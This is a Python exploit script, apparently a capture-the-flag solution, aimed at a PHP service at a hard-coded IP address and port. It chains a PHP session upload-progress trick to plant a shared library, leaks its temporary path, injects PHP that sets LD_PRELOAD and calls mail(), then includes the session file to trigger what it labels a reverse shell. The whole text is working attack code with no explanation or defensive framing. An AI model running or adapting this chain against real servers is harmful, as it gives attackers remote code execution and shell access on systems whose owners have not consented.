import requests

def upload_so():
    HOST = 'http://167.71.220.114:31337/?chance=$r="a";$r["a"];&mode=chance'
    headers = {
        'Connection': 'close', 
        'Cookie': 'PHPSESSID=dm1',
    }

    data = {'PHP_SESSION_upload_so_PROGRESS': 'preloooad'}

    file = open("pay.so","rb")
    try:
        requests.post(HOST, headers=headers, files={'f':file}, data=data)
        print("Something is wrong..?")
    except:
        file.close()
        print("upload_so Done")

def attack2(lib):
    HOST = 'http://167.71.220.114:31337/'
    headers = {
        'Connection': 'close', 
        'Cookie': 'PHPSESSID=dm2',
    }

    data = {'PHP_SESSION_upload_so_PROGRESS': '<?php putenv("LD_PRELOAD=%s"); mail("","","","");?>'%(lib)}
    requests.post(HOST, headers=headers, files={'f':"dummy"}, data=data)
    print("dmload setting done");

def attack3():
    print("Trying reverse shell")
    HOST = 'http://167.71.220.114:31337/?bonus=/var/lib/php/sessions/sess_dm2'
    conn = requests.get(HOST)

def leak():
    HOST = 'http://167.71.220.114:31337/?bonus=/var/lib/php/sessions/sess_dm1'
    conn = requests.get(HOST)
    parsed = conn.text
    parsed = parsed[parsed.index('/tmp'):]
    parsed = parsed[:parsed.index("\"")]
    return parsed

def exploit():
    upload_so()
    lib = leak()
    print("[*] Leak:",lib)
    attack2(lib)
    attack3()

if __name__ == "__main__":
    exploit()